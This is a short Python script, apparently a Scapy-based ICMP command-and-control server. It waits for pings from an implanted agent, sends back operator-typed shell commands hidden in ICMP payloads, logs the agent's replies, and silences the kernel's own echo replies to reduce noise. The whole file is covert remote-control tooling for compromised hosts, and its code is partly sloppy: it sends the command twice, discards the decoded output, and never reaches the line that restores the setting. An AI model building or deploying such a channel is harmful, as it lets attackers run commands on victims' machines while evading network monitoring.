"""
ICMP C2 Server Controller (Scapy-based)

- Listens for ICMP Echo Request packets from a C2 agent.
- Prompts the operator to enter a shell command to send back to the agent.
- Sends the command using an ICMP packet with custom payload.
- Waits for the Echo Reply containing the agent's response and logs it to a file.

Security Features:
- Temporarily disables kernel-level ICMP echo responses to avoid noise.
- Re-enables echo responses on exit.

Note:
- Requires root privileges due to use of raw sockets and /proc/sys control.
- Interfaces must be specified in 'interfaces' list for sniffing.
"""


from scapy.all import *
from scapy.layers.inet import ICMP, IP
import os

os.system("echo 1 | sudo tee /proc/sys/net/ipv4/icmp_echo_ignore_all")

def print_pkt(pkt):
    pkt.show()
    command = input('# Enter command: ')
    cmd_packet = IP(dst=pkt[IP].src) / ICMP(id=0x0001, seq=0x2) /Raw(load=command)
    send(cmd_packet)
    time.sleep(0.1)

    rx = sniff(iface=interfaces, filter='icmp', count=1)
    print(f"handling content received")

    send(cmd_packet)
    rx[0][Raw].load.decode()
    with open("filename.txt", "a") as file:
        file.write(f"{rx}")
    print(rx)

interfaces = ['wlp2s0','vmnet8']
pkt = sniff(iface=interfaces, filter='icmp', prn=print_pkt)

os.system("echo 0 | sudo tee /proc/sys/net/ipv4/icmp_echo_ignore_all")